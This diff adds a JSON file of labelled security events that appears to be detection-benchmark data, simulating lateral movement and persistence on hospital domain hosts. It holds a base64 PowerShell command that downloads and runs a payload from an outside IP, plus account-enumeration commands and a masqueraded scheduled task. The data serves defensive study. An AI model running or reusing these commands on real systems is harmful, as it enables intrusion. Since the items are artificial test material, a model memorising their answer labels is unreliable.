@@ -1,0 +1,121 @@
+[
+  {
+    "event_id": "5156",
+    "sequence": 1,
+    "timestamp": "2022-11-03T14:22:11+05:30",
+    "host": "AIIMS-PATIENT-MGMT-01",
+    "account": "svc_backup$",
+    "event_type": "network_connection_outbound",
+    "connections": [
+      {"dst_ip": "10.0.4.52", "dst_port": 445, "protocol": "TCP", "result": "success", "timestamp": "2022-11-03T14:22:11+05:30"},
+      {"dst_ip": "10.0.4.53", "dst_port": 445, "protocol": "TCP", "result": "success", "timestamp": "2022-11-03T14:22:14+05:30"},
+      {"dst_ip": "10.0.4.61", "dst_port": 445, "protocol": "TCP", "result": "connection_refused", "timestamp": "2022-11-03T14:22:17+05:30"},
+      {"dst_ip": "10.0.4.78", "dst_port": 445, "protocol": "TCP", "result": "success", "timestamp": "2022-11-03T14:22:20+05:30"},
+      {"dst_ip": "10.0.8.10", "dst_port": 445, "protocol": "TCP", "result": "success", "timestamp": "2022-11-03T14:22:23+05:30"}
+    ],
+    "source_ip": "10.0.4.30",
+    "inter_connection_interval_ms": 3000,
+    "mitre_technique": "T1021.002",
+    "mitre_technique_name": "Remote Services: SMB/Windows Admin Shares",
+    "anomaly_signals": [
+      "smb_sweep: 5 port 445 connections in 12 seconds from single host — subnet scanning pattern",
+      "novel_behavior: ZERO baseline entries of AIIMS-PATIENT-MGMT-01 initiating outbound SMB connections",
+      "cross_subnet_smb: connection from 10.0.4.30 to 10.0.8.10 (admin subnet) violates network segmentation baseline",
+      "sequential_ips: .52, .53, .61, .78, .10 — sequential scan pattern, not organic traffic"
+    ],
+    "baseline_deviation_score": 0.88,
+    "ground_truth_note": "MALICIOUS: SMB subnet sweep from AIIMS-PATIENT-MGMT-01. This host has NEVER initiated outbound SMB in the 30-day baseline. The sequential IP pattern (.52, .53, .61, .78) is a textbook SMB sweep — attacker is enumerating which systems have open file shares. Critically, .10 is in the admin subnet (10.0.8.10 = AIIMS-DC-01), indicating attacker already knows or has guessed the domain controller address. The 3-second inter-connection interval suggests automated tooling, not human clicking."
+  },
+  {
+    "event_id": "4624",
+    "sequence": 2,
+    "timestamp": "2022-11-03T14:29:07+05:30",
+    "host": "AIIMS-DC-01",
+    "account": "svc_backup$",
+    "logon_type": 3,
+    "source_ip": "10.0.4.30",
+    "dest_ip": "10.0.8.10",
+    "auth_package": "NTLM",
+    "workstation_name": "AIIMS-PATIENT-MGMT-01",
+    "session_id": "0xb2c3d4",
+    "logon_process": "NtLmSsp",
+    "mitre_technique": "T1021.002",
+    "anomaly_signals": [
+      "service_account_to_dc: svc_backup$ has NEVER authenticated to AIIMS-DC-01 in baseline",
+      "source_anomaly: source is AIIMS-PATIENT-MGMT-01 (clinical server) — not the backup server",
+      "lateral_movement_chain: this is the second hop — attacker moved from 10.0.4.47 → PATIENT-MGMT-01 → DC-01",
+      "ntlm_to_dc: NTLM auth to domain controller (vs Kerberos) indicates pass-the-hash attack possible"
+    ],
+    "baseline_deviation_score": 0.93,
+    "ground_truth_note": "MALICIOUS: Attacker authenticates svc_backup$ credentials to the Domain Controller from AIIMS-PATIENT-MGMT-01. This is the second lateral movement hop. NTLM authentication to a domain controller (rather than Kerberos) is a strong indicator of pass-the-hash — the attacker likely extracted the NTLM hash from AIIMS-PATIENT-MGMT-01's memory after the Day 1 compromise and is now using it. Domain Controllers should never receive NTLM auth from clinical servers for service accounts."
+  },
+  {
+    "event_id": "4688",
+    "sequence": 3,
+    "timestamp": "2022-11-03T14:31:22+05:30",
+    "host": "AIIMS-DC-01",
+    "account": "svc_backup$",
+    "process_name": "net.exe",
+    "process_id": "0x2b5c",
+    "parent_process_name": "cmd.exe",
+    "parent_process_id": "0x2a4c",
+    "command_line": "net user /domain",
+    "mitre_technique": "T1087.002",
+    "mitre_technique_name": "Account Discovery: Domain Account",
+    "anomaly_signals": [
+      "domain_enum_on_dc: net user /domain executed ON the domain controller — maximum visibility into all accounts",
+      "service_acct_interactive: service account running interactive net commands on DC is extremely anomalous",
+      "post_lateral_enum: executed 2 minutes after successful SMB auth to DC — classic post-access enumeration"
+    ],
+    "baseline_deviation_score": 0.95,
+    "ground_truth_note": "MALICIOUS: 'net user /domain' executed on AIIMS-DC-01 by svc_backup$ dumps all domain user accounts. On a domain controller, this returns every account in AD — giving the attacker a full user list to target for credential attacks, select high-value accounts to impersonate, or identify service accounts for further compromise. No backup service ever needs to enumerate domain users."
+  },
+  {
+    "event_id": "4688",
+    "sequence": 4,
+    "timestamp": "2022-11-03T14:33:55+05:30",
+    "host": "AIIMS-DC-01",
+    "account": "svc_backup$",
+    "process_name": "whoami.exe",
+    "process_id": "0x2c6d",
+    "parent_process_name": "cmd.exe",
+    "parent_process_id": "0x2a4c",
+    "command_line": "whoami /all",
+    "output_captured": "User: AIIMS\\svc_backup$  Groups: Domain Users, Backup Operators, Domain Admins (via nested group)",
+    "mitre_technique": "T1087.002",
+    "anomaly_signals": [
+      "privilege_discovery: /all flag reveals group memberships — attacker confirming they have Domain Admin via nested groups",
+      "nested_group_da: svc_backup$ is in Backup Operators which has Domain Admin nested — critical misconfiguration exploitation",
+      "dc_execution: whoami /all on domain controller confirms full domain compromise"
+    ],
+    "baseline_deviation_score": 0.96,
+    "ground_truth_note": "MALICIOUS: 'whoami /all' confirms the attacker has discovered they have Domain Admin rights via a nested group (Backup Operators → Domain Admins). This is a critical configuration weakness in AIIMS's Active Directory — the backup service account was given Domain Admin rights for convenience. The attacker now knows they have keys to the entire kingdom. This output would have been logged and a DLP-aware SIEM should have flagged 'Domain Admins' appearing in process output from a service account."
+  },
+  {
+    "event_id": "4698",
+    "sequence": 5,
+    "timestamp": "2022-11-03T14:47:33+05:30",
+    "host": "AIIMS-DC-01",
+    "account": "svc_backup$",
+    "event_type": "scheduled_task_created",
+    "task_name": "MicrosoftEdgeUpdateTaskMachineUA",
+    "task_path": "\\Microsoft\\Windows\\",
+    "task_description": "Keeps your Microsoft Edge browser up to date.",
+    "task_command": "C:\\Windows\\System32\\cmd.exe",
+    "task_arguments": "/c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAnACkA",
+    "task_trigger": "AtLogon",
+    "task_run_as": "SYSTEM",
+    "mitre_technique": "T1053.005",
+    "mitre_technique_name": "Scheduled Task/Job: Scheduled Task",
+    "anomaly_signals": [
+      "masquerade_name: task name 'MicrosoftEdgeUpdateTaskMachineUA' mimics legitimate Edge updater — lolbas masquerading",
+      "cmd_powershell_chain: task runs cmd.exe → powershell with base64 encoded payload",
+      "encoded_payload: base64 decodes to IEX WebClient downloading from 185.220.101.47 (Tor exit node — seen in Day 12)",
+      "system_persistence: task runs as SYSTEM at every logon — maximum privilege persistence",
+      "created_by_service_acct: scheduled tasks should be created by SYSTEM or admin_raj, not svc_backup$",
+      "dc_persistence: persistence established on domain controller = entire domain persistence"
+    ],
+    "baseline_deviation_score": 0.98,
+    "ground_truth_note": "MALICIOUS: This is the attacker establishing persistence on the Domain Controller itself. The task name is a deliberate masquerade of the legitimate 'MicrosoftEdgeUpdateTaskMachineUA' scheduled task. The base64-encoded PowerShell downloads a payload from 185.220.101.47 — the same Tor exit node used for C2 in Day 12. This backward chaining is forensically significant: the C2 infrastructure was already set up before the first lateral movement. Task created by svc_backup$ (a service account) creating a SYSTEM-level scheduled task is a near-certain malicious indicator. Containment opportunity: killing this task on Day 3 would have stopped persistence and all subsequent compromise."
+  }
+]
